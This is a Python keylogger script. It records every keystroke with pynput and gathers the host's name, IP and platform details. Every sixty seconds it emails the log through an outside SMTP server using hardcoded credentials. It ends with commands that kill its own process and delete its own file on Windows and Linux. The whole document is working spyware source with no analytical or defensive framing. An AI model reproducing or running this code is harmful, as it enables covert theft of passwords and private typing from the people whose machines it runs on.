import os
import platform
import smtplib
import socket
import threading
from pynput import keyboard

EMAIL_ADDRESS = "990ab68b3c2440"
EMAIL_PASSWORD = "e0d59dc2b285fa"

SEND_REPORT_EVERY = 60
# in sconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log = "KeyLogger Started..."
        self.system_information()

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message): 
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        m = f"""\
        Subject: main Mailtrap
        To: {receiver}
        From: {sender}

        Keys Received\n"""

        m += message
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender, receiver, message)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print("File was closed.")
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print("File is close.")
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("pkill leafpad")
                os.system("chattr -i " + os.path.basename(__file__))
                print("File was closed.")
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print("File is close.")


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
